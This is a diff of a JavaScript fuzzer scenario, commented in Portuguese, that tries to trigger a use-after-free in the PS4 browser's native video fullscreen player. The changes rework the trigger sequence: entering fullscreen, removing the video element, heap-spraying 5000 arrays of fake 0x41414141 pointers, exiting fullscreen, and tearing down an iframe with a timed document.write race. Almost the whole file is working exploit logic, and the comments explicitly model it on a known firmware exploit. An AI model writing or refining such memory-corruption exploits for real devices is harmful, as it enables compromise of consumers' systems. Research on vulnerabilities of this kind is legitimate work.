@@ -1,29 +1,30 @@
+
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (The Leandro's Teardown)
- * Alvo: FullscreenVideoController + FrameLoader Teardown
+ * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Manx Native Fusion)
+ * Alvo: MediaPlayerPrivateManx + FrameLoader Teardown
  */
 
 export default {
     id:       'VIDEO_FULLSCREEN_REMOVE',
     category: 'Media',
     risk:     'CRITICAL',
-    description: 'Incorpora o delay de 500ms e o document.write teardown para forçar ' +
-                 'o crash do FullscreenController usando um Iframe como sandbox, ' +
-                 'tentando injetar ponteiros falsos (0x41414141).',
+    description: 'Usa a lógica do exploit 12.00 (webkitEnterFullscreen nativo) combinada com ' +
+                 'o teardown de iframe assíncrono para causar UAF no hardware gráfico da PS4.',
 
     setup: async function() {
-        // Criamos um Iframe para isolar o ataque e proteger o Fuzzer
         this.iframe = document.createElement('iframe');
         this.iframe.setAttribute('allowfullscreen', 'true');
-        this.iframe.style.opacity = '0.01'; // Quase invisível
+        this.iframe.style.opacity = '0.01';
         document.body.appendChild(this.iframe);
 
         const doc = this.iframe.contentDocument;
         this.video = doc.createElement('video');
         this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
+        // Atributos importantes para forçar a renderização nativa
+        this.video.controls = true;
+        this.video.preload = "auto";
         doc.body.appendChild(this.video);
 
-        // O nosso payload malicioso (Ponteiros 0x41414141)
         this.sprayPayload = new Uint32Array(256);
         this.sprayPayload.fill(0x41414141);
 
@@ -38,16 +39,21 @@ export default {
 
     trigger: async function() {
         try {
-            // 1. Entramos em Fullscreen no contexto do Iframe
-            if (this.video.webkitRequestFullscreen) this.video.webkitRequestFullscreen();
+            // 1. O SEGREDO DO 12.00: Chama o reprodutor nativo (Manx)
+            // Tenta forçar a entrada mesmo sem o click explícito, usando fallback
+            if (this.video.webkitEnterFullscreen) {
+                this.video.webkitEnterFullscreen();
+            } else if (this.video.webkitRequestFullscreen) {
+                this.video.webkitRequestFullscreen();
+            }
 
-            // 2. O seu segredo: 500ms para o OrbisOS preparar a superfície gráfica perfeitamente
-            await new Promise(r => setTimeout(r, 500));
+            // O tempo de espera que você identificou como crítico
+            await new Promise(r => setTimeout(r, 400));
 
-            // 3. FREE: Apagamos o vídeo
+            // 2. FREE: Destruímos o elemento
             this.video.remove();
 
-            // 4. REUSE (SPRAY): Preenchemos o buraco com 5000 buffers falsos
+            // 3. SPRAY: Enchemos a memória de 0x41414141
             this.spray = [];
             for (let i = 0; i < 5000; i++) {
                 let arr = new Uint32Array(256);
@@ -55,25 +61,27 @@ export default {
                 this.spray.push(arr);
             }
 
-            // 5. USE: Dizemos ao sistema para sair do Fullscreen
-            if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+            // 4. O ATAQUE DIRETO DO 12.00: Saída nativa do player
+            if (this.video.webkitExitFullscreen) {
+                this.video.webkitExitFullscreen();
+            } else if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            }
 
-            // 6. O TEARDOWN: O seu segundo segredo.
-            // Executamos o document.write de forma assíncrona logo após o exit.
-            // Isto destrói a base do C++ enquanto o controlador ainda tenta ler a memória.
+            // 5. O TEARDOWN: Substitui o location.reload() do 12.00.
+            // Destrói o ambiente do iframe 100ms depois, criando a Race Condition perfeita.
             setTimeout(() => {
                 try {
                     this.iframe.contentDocument.write('PWNED');
                     this.iframe.contentDocument.close();
                 } catch(e) {}
-            }, 10);
+            }, 100);
 
         } catch(e) {}
     },
 
     probe: [
         s => s.video.readyState,
-        s => s.video.networkState,
         s => s.video.webkitDecodedFrameCount,
         s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
     ],
